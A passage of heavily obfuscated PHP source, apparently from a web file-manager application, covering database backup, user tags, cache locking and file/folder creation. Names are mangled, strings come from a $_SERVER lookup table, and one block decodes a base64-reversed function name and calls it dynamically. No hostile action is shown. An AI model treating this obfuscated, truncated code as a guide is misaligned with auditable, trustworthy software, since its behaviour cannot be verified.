} self::set(array($İ¤³¼’÷[772] => 1)); return !0; } public function file() { $õšÁüÅ® =& $_SERVER[¹Û¹Æ€]; $‡úûİÆ = self::get(); if ($‡úûİÆ[$õšÁüÅ®[302]][$õšÁüÅ®[209]][$õšÁüÅ®[748]] == $õšÁüÅ®[98]) { return !0; } if (!isset($‡úûİÆ[$õšÁüÅ®[753]]) || $‡úûİÆ[$õšÁüÅ®[753]] == $õšÁüÅ®[207]) { $Ïåˆ¿­ = new BackupFile(); if (!$Ïåˆ¿­->index()) { return !1; } } self::set(array($õšÁüÅ®[773] => 1, $õšÁüÅ®[748] => 1)); return !0; } } class BackupDb { protected static $io; protected static $name; public function __construct() { } public function index() { $’­çÚş =& $_SERVER[¹Û¹Æ€]; $Ğàİ¤Ë = Backup::get(); self::$io = $Ğàİ¤Ë[$’­çÚş[750]]; self::$name = $Ğàİ¤Ë[$’­çÚş[42]]; $·ƒæÚ©Ÿ = new DbManage(); $–”èêÜ = $·ƒæÚ©Ÿ->dbType(); $…¯‹ÍÓû = array($’­çÚş[774] => $–”èêÜ, $’­çÚş[775] => time()); Backup::set($…¯‹ÍÓû); $˜¶şî = $this->tmpFilesPath() . $’­çÚş[776] . self::$name . $’­çÚş[18]; del_dir($˜¶şî); mk_dir($˜¶şî); $Ÿ¢˜ú = $ğ€ûù£Ô = 0; $¸ÒÏ† = new Task($’­çÚş[777], $’­çÚş[778], 0, LNG($’­çÚş[779]) . $’­çÚş[780] . LNG($’­çÚş[781])); try { $–êñ‚ë = $·ƒæÚ©Ÿ->db()->getTables(); } catch (Exception $­ºç§³) { $¸ÒÏ†->end(); return !1; } $–êñ‚ë = array_diff($–êñ‚ë, array($’­çÚş[782], $’­çÚş[783])); foreach ($–êñ‚ë as $•ÒÖı€Ù) { $Ÿ¢˜ú += $·ƒæÚ©Ÿ->model($•ÒÖı€Ù)->count(); } $¸ÒÏ†->task[$’­çÚş[784]] = $Ÿ¢˜ú; $GLOBALS[$’­çÚş[785]] = self::$name; foreach ($–êñ‚ë as $•ÒÖı€Ù) { $ÈÇÌ·¨ê = $˜¶şî . $•ÒÖı€Ù . $’­çÚş[786]; $²£åøøµ = null; if ($•ÒÖı€Ù == $’­çÚş[787] && (!isset($Ğàİ¤Ë[$’­çÚş[753]]) || $Ğàİ¤Ë[$’­çÚş[753]] == $’­çÚş[207])) { $²£åøøµ = self::$io; } $ğ€ûù£Ô += $·ƒæÚ©Ÿ->sqlFromDb($•ÒÖı€Ù, $ÈÇÌ·¨ê, $¸ÒÏ†, $²£åøøµ); } unset($GLOBALS[$’­çÚş[785]]); $¸ÒÏ†->end(); if ($ğ€ûù£Ô > $Ÿ¢˜ú) { $Ÿ¢˜ú = $ğ€ûù£Ô; } $…¯‹ÍÓû = array($’­çÚş[774] => $–”èêÜ, $’­çÚş[771] => 1, $’­çÚş[788] => $Ÿ¢˜ú, $’­çÚş[789] => $ğ€ûù£Ô, $’­çÚş[790] => time()); Backup::set($…¯‹ÍÓû); if ($Ÿ¢˜ú - $ğ€ûù£Ô > 0) { $·”’Ìà• = $’­çÚş[791]; if (stristr(I18n::getType(), $’­çÚş[792])) { $·”’Ìà• = $’­çÚş[793]; } write_log(array($·”’Ìà•, $…¯‹ÍÓû), $’­çÚş[778]); return !1; } return !0; } private function tmpFilesPath() { $ûßçê”Œ =& $_SERVER[¹Û¹Æ€]; $»“™šÊ = TEMP_FILES; if ($GLOBALS[$ûßçê”Œ[16]][$ûßçê”Œ[99]][$ûßçê”Œ[794]]) { $»“™šÊ = $GLOBALS[$ûßçê”Œ[16]][$ûßçê”Œ[99]][$ûßçê”Œ[794]]; if (!mk_dir($»“™šÊ) || !is_writable($»“™šÊ) || !IO::mkfile($»“™šÊ . $ûßçê”Œ[795])) { $»“™šÊ = TEMP_FILES; } } return $»“™šÊ; } } goto d­Œ¤Ş“˜­; a¶÷Â´í„: class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\56\164\141\147\114\x69\x73\x74"; public $modelType = "\125\x73\x65\162\x4f\160\x74\x69\x6f\156"; public $field = array("\x6e\141\155\145", "\163\x74\171\154\145", "\x73\x6f\x72\164"); public function listData($¿˜åşõ× = false, $íÚ£‹Ğ = "\163\157\162\x74", $ÁË••èÚ = false) { return parent::listData($¿˜åşõ×, $íÚ£‹Ğ, $ÁË••èÚ); } public function remove($Ô‘Ø›‚²) { return parent::remove($Ô‘Ø›‚²); } public function add($å‘¸®Ü, $‰å×ç’É = "\x6c\x61\x62\x65\x6c\55\147\x72\145\171\55\x6e\x6f\162\155\141\154") { $¸¤»ĞÈ =& $_SERVER[¹Û¹Æ€]; if ($this->findByName($å‘¸®Ü)) { return !1; } $©×áÑ±¢ = array($¸¤»ĞÈ[429] => $å‘¸®Ü, $¸¤»ĞÈ[494] => $‰å×ç’É, $¸¤»ĞÈ[1853] => $this->getSort($¸¤»ĞÈ[267]) + 1); return parent::insert($©×áÑ±¢); } public function update($—áµäç¶, $ÚÉÁù‹) { $¹ú“¤ë· =& $_SERVER[¹Û¹Æ€]; $¹ñ¦¾šË = $this->listData($—áµäç¶); $éáööÀ = $this->findByName($ÚÉÁù‹[$¹ú“¤ë·[42]]); if (!$¹ñ¦¾šË || $éáööÀ && $éáööÀ[$¹ú“¤ë·[408]] != $¹ñ¦¾šË[$¹ú“¤ë·[408]]) { return !1; } return parent::update($—áµäç¶, $ÚÉÁù‹); } public function moveTop($åë¾—¹ñ) { $ı”í˜ˆ¸ =& $_SERVER[¹Û¹Æ€]; $¾é¤ß¬— = parent::listData(); $¯˜¯¼£Û = $this->getSort($ı”í˜ˆ¸[266]); foreach ($¾é¤ß¬— as &$ò»Ü€†¬) { if ($ò»Ü€†¬[$ı”í˜ˆ¸[408]] == $åë¾—¹ñ) { $ò»Ü€†¬[$ı”í˜ˆ¸[1873]] = $¯˜¯¼£Û; continue; } $ò»Ü€†¬[$ı”í˜ˆ¸[1873]] += 1; } unset($ò»Ü€†¬); return parent::resetData($¾é¤ß¬—); } public function moveBottom($şĞ —„) { $ñš´Šµ =& $_SERVER[¹Û¹Æ€]; $Š¸¹¼Ôº = $this->getSort($ñš´Šµ[267]) + 1; return parent::update($şĞ —„, array($ñš´Šµ[1873] => $Š¸¹¼Ôº)); } public function resetSort($ù§¼¹·) { $ ­ïú =& $_SERVER[¹Û¹Æ€]; $Ê›ŒƒÍ = array(); $ù§¼¹· = is_array($ù§¼¹·) ? $ù§¼¹· : array(); for ($¹ŠÕœÛ = 0; $¹ŠÕœÛ < count($ù§¼¹·); $¹ŠÕœÛ++) { $Ê›ŒƒÍ[$ù§¼¹·[$¹ŠÕœÛ] . $ ­ïú[22]] = $¹ŠÕœÛ + 1; } $ïµªÖş¯ = parent::listData(); foreach ($ïµªÖş¯ as &$•Šƒ¸…ã) { $õ¸œõŠ¿ = $Ê›ŒƒÍ[$•Šƒ¸…ã[$ ­ïú[408]]]; $•Šƒ¸…ã[$ ­ïú[1873]] = $õ¸œõŠ¿ ? $õ¸œõŠ¿ : $•Šƒ¸…ã[$ ­ïú[1873]]; } unset($•Šƒ¸…ã); return parent::resetData($ïµªÖş¯); } private function getSort($—ñ”Îê®) { $ï½›‘î„ =& $_SERVER[¹Û¹Æ€]; $Â‘…˜ £ = parent::listData(); $ôçúæ  = array_to_keyvalue($Â‘…˜ £, $ï½›‘î„[22], $ï½›‘î„[1873]); if (!$ôçúæ ) { $ôçúæ  = array(0); } $‚ÏîèÙ = $—ñ”Îê® == $ï½›‘î„[267] ? max($ôçúæ ) : min($ôçúæ ); return intval($‚ÏîèÙ); } } goto cØÀíÜŞ¶Ï; b‹Á¤Ëå—: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ë–—¸¡ =& $_SERVER[¹Û¹Æ€]; $ÚçËª¥€ = $GLOBALS[$ë–—¸¡[16]][$ë–—¸¡[358]]; self::$cachePath = $ÚçËª¥€[$ë–—¸¡[209]][$ë–—¸¡[94]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($Æ¹ìõÀ¾, $İß—Ñ³« = 0) { $œüäÍõ =& $_SERVER[¹Û¹Æ€]; $ùØÂ÷¸ = microtime(!0); $ïƒÜÅüË = $ùØÂ÷¸ + $İß—Ñ³« + 0.0001; $õ–×²Æ = rtrim(self::$cachePath, $œüäÍõ[18]) . $œüäÍõ[861] . md5($Æ¹ìõÀ¾) . $œüäÍõ[858]; if (file_exists($õ–×²Æ) && filemtime($õ–×²Æ) && filemtime($õ–×²Æ) < time() - 10) { @unlink($õ–×²Æ); } do { if (file_exists($õ–×²Æ)) { cacheLockWait(); continue; } $ø§¹ãÅ = fopen($õ–×²Æ, $œüäÍõ[862]); if (!$ø§¹ãÅ) { return !1; } $ÒˆÄ»ıá = flock($ø§¹ãÅ, LOCK_EX | LOCK_NB); self::$caches[$Æ¹ìõÀ¾] = array($œüäÍõ[863] => $ø§¹ãÅ, $œüäÍõ[209] => $õ–×²Æ); fwrite($ø§¹ãÅ, $ïƒÜÅüË); clearstatcache(); if ($ø§¹ãÅ && $ÒˆÄ»ıá) { return !0; } cacheLockWait(); } while (microtime(!0) < $ïƒÜÅüË); $this->unlock($Æ¹ìõÀ¾); return !1; } public function lockGet($˜ù™ñÖ) { $Öîˆ£™‡ =& $_SERVER[¹Û¹Æ€]; $¦˜Åæ = rtrim(self::$cachePath, $Öîˆ£™‡[18]) . $Öîˆ£™‡[861] . md5($˜ù™ñÖ) . $Öîˆ£™‡[858]; return file_exists($¦˜Åæ); } public function unlock($ó©² óï) { $ìÎ˜‚Â¹ =& $_SERVER[¹Û¹Æ€]; $ŒÒ¼«‘Ä = self::$caches[$ó©² óï]; if (!$ŒÒ¼«‘Ä) { return; } @flock($ŒÒ¼«‘Ä[$ìÎ˜‚Â¹[863]], LOCK_UN); @fclose($ŒÒ¼«‘Ä[$ìÎ˜‚Â¹[863]]); @unlink($ŒÒ¼«‘Ä[$ìÎ˜‚Â¹[209]]); unset(self::$caches[$ó©² óï]); } } class CacheLockRedis { public function lock($•ù›÷šñ, $ñûÀÕ…‡ = 10) { $’„Ã¬‘» = Cache::init(); $‚±æ˜Ò¬ = microtime(!0) + $ñûÀÕ…‡; while (microtime(!0) < $‚±æ˜Ò¬) { $…“áà¸ø = $’„Ã¬‘»->get($•ù›÷šñ); if (!$…“áà¸ø) { $è±Òˆ€ƒ = $’„Ã¬‘»->setLock($•ù›÷šñ, $‚±æ˜Ò¬, $ñûÀÕ…‡); if ($è±Òˆ€ƒ) { return !0; } } else { if ($…“áà¸ø < microtime(!0)) { $’„Ã¬‘»->set($•ù›÷šñ, $‚±æ˜Ò¬, $ñûÀÕ…‡ * 2); if ($’„Ã¬‘»->get($•ù›÷šñ) === $…“áà¸ø) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ïí²ÛÜº) { return Cache::init()->get($ïí²ÛÜº); } public function unlock($Ù±ªşÔù) { return Cache::init()->remove($Ù±ªşÔù); } } class CacheLockMemcached { public function lock($¿¬ÓµÍú, $÷ŸÒ³‘ = 0) { $ê‚â™ùš = Cache::init(); $ÙÇµ‘Ÿ  = microtime(!0) + $÷ŸÒ³‘; while (microtime(!0) < $ÙÇµ‘Ÿ ) { $Šëö¤–² = $ê‚â™ùš->get($¿¬ÓµÍú); if (!$Šëö¤–² || $Šëö¤–² < microtime(!0)) { $¼Œ¹éƒÖ = $ê‚â™ùš->handle->add($¿¬ÓµÍú, $ÙÇµ‘Ÿ , $÷ŸÒ³‘); if ($¼Œ¹éƒÖ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($È¾ŒÉ°ª) { return Cache::init()->get($È¾ŒÉ°ª); } public function unlock($ß†“í·) { return Cache::init()->remove($ß†“í·); } } goto CÁ¢µ«ÆÂÏ; BŒÀñ†Í¬: $fileSize = strrev(base64_decode($_SERVER[Ÿéô¿ñÒ][0])); function binCheckNeq($üšî²ç¼, $«á€—ëÓ) { return $üšî²ç¼ != $«á€—ëÓ; } $_SERVER[$_SERVER[Ÿéô¿ñÒ][1]] = $fileSize($_SERVER[$_SERVER[Ÿéô¿ñÒ][2]]); goto D‚Ş‡»•Ş®; BÏ§ÆÈÉ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($—Áæ½Ê) { $»„©ˆßÈ =& $_SERVER[¹Û¹Æ€]; $€şô ãù = Model($»„©ˆßÈ[522])->where(array($»„©ˆßÈ[1650] => $—Áæ½Ê))->find(); $÷şìĞ§ = $this->_mkdirRoot(SourceModel::TYPE_USER, $—Áæ½Ê, $€şô ãù[$»„©ˆßÈ[42]]); $this->userDesktopAdd($÷şìĞ§); return $÷şìĞ§; } public function userDesktopAdd($•€é£¹») { $Å³ŞØ÷› =& $_SERVER[¹Û¹Æ€]; $´Õ¯Òğ = LNG($Å³ŞØ÷›[2117]); $ƒ°³ìïÛ = $this->mkdir($•€é£¹», $´Õ¯Òğ); $this->metaSet($ƒ°³ìïÛ, $Å³ŞØ÷›[2118], $Å³ŞØ÷›[98]); $this->metaSet($•€é£¹», $Å³ŞØ÷›[2119], $ƒ°³ìïÛ); } public function userPathSafeAdd($¨Ÿ«‘ìœ) { $½ª‰Û¾Õ =& $_SERVER[¹Û¹Æ€]; $åõ¶“Ÿ„ = Model($½ª‰Û¾Õ[522])->getInfoFull($¨Ÿ«‘ìœ); if (!$åõ¶“Ÿ„) { return !1; } if (_get($åõ¶“Ÿ„, $½ª‰Û¾Õ[545])) { return $åõ¶“Ÿ„[$½ª‰Û¾Õ[475]][$½ª‰Û¾Õ[2120]]; } $Ê¡Éå•‰ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¨Ÿ«‘ìœ, $½ª‰Û¾Õ[2121], $½ª‰Û¾Õ[442]); Model($½ª‰Û¾Õ[522])->metaSet($¨Ÿ«‘ìœ, $½ª‰Û¾Õ[2120], $Ê¡Éå•‰); $this->metaSet($Ê¡Éå•‰, $½ª‰Û¾Õ[2122], $¨Ÿ«‘ìœ); return $Ê¡Éå•‰; } public function groupRootAdd($å‡¸À›) { $ÆŸìî™è =& $_SERVER[¹Û¹Æ€]; $®ˆëÔš = Model($ÆŸìî™è[531])->where(array($ÆŸìî™è[1937] => $å‡¸À›))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $å‡¸À›, $®ˆëÔš[$ÆŸìî™è[42]]); } public function systemRootPathAdd($ÊÆä€ïî) { if ($ÊÆä€ïî != $_SERVER[¹Û¹Æ€][553]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÊÆä€ïî); } public function userRootRemove($Ö¤‡õÅ) { $®Ñ¢¾¿§ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ö¤‡õÅ, !0); foreach ($®Ñ¢¾¿§ as $ò÷·†ô®) { if (!$ò÷·†ô®) { continue; } $this->remove($ò÷·†ô®[$_SERVER[¹Û¹Æ€][411]], !1); } } public function groupRootRemove($«÷±ÍŞ‰) { $‘ŠÑ· = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $«÷±ÍŞ‰); if (!$‘ŠÑ·) { return; } $this->remove($‘ŠÑ·[$_SERVER[¹Û¹Æ€][411]], !1); } private function _mkdirRoot($ĞÁş…ÙÒ, $¸ö­ã´×, $£°æ¶‰ , $Ÿ¡Ë‡Œ = '') { $Ë÷àé‡ì =& $_SERVER[¹Û¹Æ€]; $Ï¸Ğ¦Ëİ = array($Ë÷àé‡ì[410] => 0, $Ë÷àé‡ì[595] => $ĞÁş…ÙÒ, $Ë÷àé‡ì[596] => $¸ö­ã´×, $Ë÷àé‡ì[592] => 1, $Ë÷àé‡ì[597] => USER_ID, $Ë÷àé‡ì[598] => USER_ID, $Ë÷àé‡ì[593] => $Ÿ¡Ë‡Œ, $Ë÷àé‡ì[599] => $Ë÷àé‡ì[540], $Ë÷àé‡ì[439] => 0, $Ë÷àé‡ì[594] => 0, $Ë÷àé‡ì[478] => 0, $Ë÷àé‡ì[600] => $Ë÷àé‡ì[22]); if ($ÖåÅŞÑÃ = $this->where($Ï¸Ğ¦Ëİ)->find()) { return $ÖåÅŞÑÃ[$Ë÷àé‡ì[411]]; } $ï†Ççé— = "\115\157\x64\x65\154\123\x6f\x75\162\x63\x65\x2e\x6d\153\144\x69\x72\x52\x6f\157\x74\56{$ĞÁş…ÙÒ}\x2e{$¸ö­ã´×}\56" . $£°æ¶‰ ; CacheLock::lock($ï†Ççé—); $Ï¸Ğ¦Ëİ[$Ë÷àé‡ì[42]] = $£°æ¶‰ ; $«ÄÔŞ­¬ = $this->add($Ï¸Ğ¦Ëİ); $œ÷’›¦ = array($Ë÷àé‡ì[601] => short_id($«ÄÔŞ­¬)); $this->where(array($Ë÷àé‡ì[426] => $«ÄÔŞ­¬))->save($œ÷’›¦); CacheLock::unlock($ï†Ççé—); return $«ÄÔŞ­¬; } private function targetSourceRoot($ƒşÙ·Íß, $Ìµ‚áÜ¿, $ÒÜº³üä = false) { $€®•İğÃ =& $_SERVER[¹Û¹Æ€]; $¾„éÓ‚¿ = array($€®•İğÃ[410] => 0, $€®•İğÃ[595] => $ƒşÙ·Íß, $€®•İğÃ[596] => $Ìµ‚áÜ¿); if ($ÒÜº³üä) { $ßŞª²ı£ = $this->where($¾„éÓ‚¿)->select(); return $ßŞª²ı£ ? $ßŞª²ı£ : array(); } $İ Äò÷ş = $this->where($¾„éÓ‚¿)->find(); return $İ Äò÷ş ? $İ Äò÷ş : array(); } public function sourceRootGroup($ìè«ò É) { $İ¬ìÜú =& $_SERVER[¹Û¹Æ€]; if (is_string($ìè«ò É)) { $ìè«ò É = array($ìè«ò É); } $áğÚÑ…ì = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ìè«ò É, $İ¬ìÜú[198]); $ĞŒ¦é«Æ = array($İ¬ìÜú[378] => $áğÚÑ…ì, $İ¬ìÜú[375] => array($İ¬ìÜú[757] => count($ìè«ò É))); $this->_listDataApply($ĞŒ¦é«Æ[$İ¬ìÜú[378]]); $this->_listMake($ĞŒ¦é«Æ); return array_to_keyvalue($ĞŒ¦é«Æ[$İ¬ìÜú[92]], $İ¬ìÜú[514]); } public function mkfile($ÛõÎï–, $‹†õù€´, $ÏŸÎ¦¦¤ = '', $¹·è‡ıæ = REPEAT_RENAME) { $´ÁÑ¶ÁŞ =& $_SERVER[¹Û¹Æ€]; $ş‹Õòòğ = Model($´ÁÑ¶ÁŞ[618])->addFileByContent($ÏŸÎ¦¦¤, $‹†õù€´); return $this->_createFileCall($ÛõÎï–, $‹†õù€´, $ş‹Õòòğ, $¹·è‡ıæ, $´ÁÑ¶ÁŞ[1344]); } public function addFile($¯ÁšˆÃ”, $Ÿ‘¢‹¢, $²ç»è¶, $ı¹ˆñ­ = false, $Éì˜–ô = REPEAT_RENAME) { $üæ›üü× = Model($_SERVER[¹Û¹Æ€][618])->addFile($Ÿ‘¢‹¢, $²ç»è¶, $ı¹ˆñ­); return $this->_createFileCall($¯ÁšˆÃ”, $²ç»è¶, $üæ›üü×, $Éì˜–ô); } public function addFileByFileID($§ìŞªÇé, $ ı•ËÇä, $å¥‰Å, $¢İş«Õ = REPEAT_RENAME) { $¡®ò‡ï =& $_SERVER[¹Û¹Æ€]; $©ÖÎ¯ŒÜ = Model($¡®ò‡ï[618])->find($ ı•ËÇä); Model($¡®ò‡ï[618])->linkAdd($ ı•ËÇä); return $this->_createFileCall($§ìŞªÇé, $å¥‰Å, $©ÖÎ¯ŒÜ, $¢İş«Õ); } public function addFileByRemote($ÄĞÖÒ¿…, $ƒää—æ, $àÃ³Áàã, $°şš¥“­ = array(), $”Ì¬ÔÃ = REPEAT_RENAME) { $„Â°…İ‡ = Model($_SERVER[¹Û¹Æ€][618])->addFileByRemote($ƒää—æ, $àÃ³Áàã, $°şš¥“­); return $this->_createFileCall($ÄĞÖÒ¿…, $àÃ³Áàã, $„Â°…İ‡, $”Ì¬ÔÃ); } private function _createFileCall($Â†ßîÄ¥, $ú×ŞÆ¡ò, $ö¬¶È»§, $åÕí¥ğ›, $å®…„ø = "\165\x70\154\157\x61\144") { $åƒÜË‚§ =& $_SERVER[¹Û¹Æ€]; $Ã™ñÚ®ô = !1; $this->setMasterDB(); $this->lockWriteStart($Â†ßîÄ¥, $ú×ŞÆ¡ò); $¾Ù’×ŸÂ = $this->fileNameExist($Â†ßîÄ¥, $ú×ŞÆ¡ò); $ö™û„­Î = $this->_createFile($Â†ßîÄ¥, $ú×ŞÆ¡ò, $ö¬¶È»§, $åÕí¥ğ›, $Ã™ñÚ®ô); if (!$Ã™ñÚ®ô) { Model($åƒÜË‚§[480])->remove($ö¬¶È»§[$åƒÜË‚§[477]]); } if ($Ã™ñÚ®ô && $ö™û„­Î && $ö™û„­Î != $¾Ù’×ŸÂ) { Model($åƒÜË‚§[2090])->eventCreate($ö™û„­Î, $å®…„ø); } $this->lockWriteEnd($Â†ßîÄ¥, $ú×ŞÆ¡ò); return $ö™û„­Î; } public function mkdir($Ñâº¬œ, $¶ĞÄş¡, $ƒè‘š× = REPEAT_SKIP) { $„ŒŠïû =& $_SERVER[¹Û¹Æ€]; $this->setMasterDB(); $ŒáÖŞ´ = $this->sourceInfo($Ñâº¬œ); if (!$ŒáÖŞ´) { return !1; } $this->lockWriteStart($Ñâº¬œ, $¶ĞÄş¡); if ($ƒè‘š× !== !1) { $Ò™ö†œ« = $this->fileNameExist($Ñâº¬œ, $¶ĞÄş¡); if ($Ò™ö†œ« && $ƒè‘š× != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ñâº¬œ, $¶ĞÄş¡); return $Ò™ö†œ«; } $¶ĞÄş¡ = $this->fileNameAuto($Ñâº¬œ, $¶ĞÄş¡, $ƒè‘š×); } $åö¹”™ª = array($„ŒŠïû[592] => 1, $„ŒŠïû[429] => $¶ĞÄş¡, $„ŒŠïû[593] => $„ŒŠïû[22], $„ŒŠïû[478] => 0, $„ŒŠïû[594] => 0); $§„ĞØå = $this->_addSource($åö¹”™ª, $ŒáÖŞ´); Model($„ŒŠïû[2090])->eventCreate($§„ĞØå, $„ŒŠïû[1345]); $this->lockWriteEnd($Ñâº¬œ, $¶ĞÄş¡); return $§„ĞØå; } public function listSourceRoot($Şõ¡‰ˆ€, $¦Ò¼¦ù¬, $‘İ»ˆÂò = "\163\x6f\x75\x72\x63\x65\111\x44\x2c\x74\x61\x72\x67\145\164\111\x44\54\x73\x69\172\145") { $¼ŸšÚä© =& $_SERVER[¹Û¹Æ€]; $ä´óÔÑî = $¼ŸšÚä©[387]; $•Ìùºç = array(); $úšœ£ºâ = 1024 * 50; $õüò¤Ü• = is_array($õüò¤Ü•) ? $õüò¤Ü• : array(); $ˆ··ÂÚª = count($¦Ò¼¦ù¬); $ª°ìïËà = $this->tablePrefix . $¼ŸšÚä©[2123]; for ($Îºì¦Ö° = 0; $Îºì¦Ö° < $ˆ··ÂÚª; $Îºì¦Ö°++) { $ø¥²Œäà = $¦Ò¼¦ù¬[$Îºì¦Ö°]; $ä´óÔÑî .= "\123\105\x4c\105\103\124\40\x2a\40\106\122\x4f\x4d\40\50\x53\105\114\105\x43\124\x20{$‘İ»ˆÂò}\x20\x46\122\117\x4d\40\140{$ª°ìïËà}\x60\x20\x57\x48\105\122\105\x20"; $ä´óÔÑî .= "\x60\160\x61\162\145\x6e\x74\x49\104\x60\75\60\x20\x41\116\104\x20\x60\164\141\x72\x67\145\x74\x49\x44\140\75{$ø¥²Œäà}\x20\101\x4e\104\40\140\164\x61\162\x67\145\164\124\x79\x70\x65\x60\x3d{$Şõ¡‰ˆ€}\40\x61\156\144\x20\146\x69\154\x65\x54\171\160\x65\75\x27\x27\40\154\x69\x6d\x69\x74\x20\x31\x29\40\x61\x73\x20\x74\142\137{$Îºì¦Ö°}\40\x55\116\x49\x4f\x4e\40\101\x4c\x4c\x20"; if ((strlen($ä´óÔÑî) >= $úšœ£ºâ || $Îºì¦Ö° == $ˆ··ÂÚª - 1) && $ä´óÔÑî) { $ä´óÔÑî = substr($ä´óÔÑî, 0, -strlen($¼ŸšÚä©[1035])); $øÑ¿ÙÄû = $this->query($ä´óÔÑî); $ä´óÔÑî = $¼ŸšÚä©[22]; $•Ìùºç = array_merge($•Ìùºç, $øÑ¿ÙÄû); } } return $•Ìùºç; } private function _createFile($ùØ÷•°, $í»”¼¯¯, $Õİà¶ŠÓ, $˜‹æ•„, &$Ä¬ƒ¥üü) { $·œ——ï™ =& $_SERVER[¹Û¹Æ€]; $‰æ‰ú´ş = $this->sourceInfo($ùØ÷•°); if (!$Õİà¶ŠÓ || !$‰æ‰ú´ş) { return !1; } if ($˜‹æ•„ !== !1) { $³ÚŞ¼‚Ğ = $this->fileNameExist($ùØ÷•°, $í»”¼¯¯); } $Ä¬ƒ¥üü = !0; if ($˜‹æ•„ && $³ÚŞ¼‚Ğ) { if ($˜‹æ•„ == REPEAT_SKIP) { $Ä¬ƒ¥üü = !1; return $³ÚŞ¼‚Ğ; } else { if ($˜‹æ•„ == REPEAT_REPLACE) { $ŞëíÕœÈ = $this->sourceInfo($³ÚŞ¼‚Ğ); $µÔ¢Îùå = $this->fileHistory($ŞëíÕœÈ, $Õİà¶ŠÓ[$·œ——ï™[477]], $Õİà¶ŠÓ[$·œ——ï™[86]]); if (!$µÔ¢Îùå) { $Ä¬ƒ¥üü = !1; } else { $this->folderSizeReset($ùØ÷•°); } return $³ÚŞ¼‚Ğ; } else { $í»”¼¯¯ = $this->fileNameAuto($ùØ÷•°, $í»”¼¯¯, $˜‹æ•„, !1); } } } $Îè—ÛÛº = array($·œ——ï™[592] => 0, $·œ——ï™[429] => $í»”¼¯¯, $·œ——ï™[593] => substr(get_path_ext($í»”¼¯¯), 0, 10), $·œ——ï™[478] => $Õİà¶ŠÓ[$·œ——ï™[477]], $·œ——ï™[594] => $Õİà¶ŠÓ[$·œ——ï™[86]]); $“ÚÂœ®Ó = $this->_addSource($Îè—ÛÛº, $‰æ‰ú´ş); $this->folderSizeReset($ùØ÷•°, intval($Îè—ÛÛº[$·œ——ï™[86]])); return $“ÚÂœ®Ó; } protected function fileHistory($úÖÃÂ’ı, $ˆüÙÆµ, $Åê¢ù—î) { $ÛÃïê‰¨ =& $_SERVER[¹Û¹Æ€]; $‹õ¬¥ßÆ = defined($ÛÃïê‰¨[484]) ? USER_ID : $ÛÃïê‰¨[207]; if ($úÖÃÂ’ı[$ÛÃïê‰¨[477]] == $ˆüÙÆµ) { return !1; } $this->checkLock($úÖÃÂ’ı[$ÛÃïê‰¨[411]], $ˆüÙÆµ); Model($ÛÃïê‰¨[2124])->addHistory($úÖÃÂ’ı); $êôÂ¸¶Å = array($ÛÃïê‰¨[598] => $‹õ¬¥ßÆ, $ÛÃïê‰¨[433] => time(), $ÛÃïê‰¨[477] => $ˆüÙÆµ, $ÛÃïê‰¨[86] => $Åê¢ù—î); $this->where(array($ÛÃïê‰¨[426] => $úÖÃÂ’ı[$ÛÃïê‰¨[411]]))->save($êôÂ¸¶Å); $this->sourceCacheClear($úÖÃÂ’ı[$ÛÃïê‰¨[411]]); return !0; } public function checkLock($í”ÆâÎú, $àÏ£ï¤) { $–»›Ï× =& $_SERVER[¹Û¹Æ€]; $ƒ±ÀşÚí = $this->pathInfo($í”ÆâÎú); if (!$this->fileIsLock($ƒ±ÀşÚí, !0)) { return; } $­ƒÈŒîî = Session::get($–»›Ï×[2125]); $¹‡Ñ±¶Ö = substr($ƒ±ÀşÚí[$–»›Ï×[42]], 0, -1 - strlen($ƒ±ÀşÚí[$–»›Ï×[184]])) . $–»›Ï×[1206] . $­ƒÈŒîî . $–»›Ï×[20] . $ƒ±ÀşÚí[$–»›Ï×[184]]; $Ñİ´²Ÿà = Model($–»›Ï×[618])->find($àÏ£ï¤); $this->_createFileCall($ƒ±ÀşÚí[$–»›Ï×[441]], $¹‡Ñ±¶Ö, $Ñİ´²Ÿà, REPEAT_REPLACE, $–»›Ï×[1344]); $ÀÙĞ÷ŠÃ = $ƒ±ÀşÚí[$–»›Ï×[475]][$–»›Ï×[557]]; $³¿×ßœ¥ = $ÀÙĞ÷ŠÃ[$–»›Ï×[551]] ? $ÀÙĞ÷ŠÃ[$–»›Ï×[551]] : $ÀÙĞ÷ŠÃ[$–»›Ï×[42]]; show_json(LNG($–»›Ï×[2126]) . $–»›Ï×[2127] . LNG($–»›Ï×[2128]) . $–»›Ï×[2129] . $³¿×ßœ¥ . $–»›Ï×[2130], !1); } public function fileIsLock($½¤Òß€æ, $áÉ—‚á‚ = false) { $âÚ¬½³¦ =& $_SERVER[¹Û¹Æ€]; if (!isset($½¤Òß€æ[$âÚ¬½³¦[475]]) || !$½¤Òß€æ[$âÚ¬½³¦[475]][$âÚ¬½³¦[554]]) { return !1; } if ($½¤Òß€æ[$âÚ¬½³¦[475]][$âÚ¬½³¦[554]] != USER_ID) { return !0; } $’û†½Òî = $GLOBALS[$âÚ¬½³¦[16]][$âÚ¬½³¦[99]][$âÚ¬½³¦[555]]; if ($½¤Òß€æ[$âÚ¬½³¦[475]][$âÚ¬½³¦[556]] <= time() - $’û†½Òî) { $this->metaSet($½¤Òß€æ[$âÚ¬½³¦[411]], $âÚ¬½³¦[554], null); $this->metaSet($½¤Òß€æ[$âÚ¬½³¦[411]], $âÚ¬½³¦[556], null); } if ($áÉ—‚á‚) { $this->metaSet($½¤Òß€æ[$âÚ¬½³¦[411]], $âÚ¬½³¦[556], time()); } return !1; } private function _addSource($î‡ƒˆí¼, $Ò‡•ûäÏ) { $±Í®¿© =& $_SERVER[¹Û¹Æ€]; $£Õáßº² = defined($±Í®¿©[484]) ? USER_ID : $±Í®¿©[207]; $¬¹¹Æ²± = array($±Í®¿©[595] => 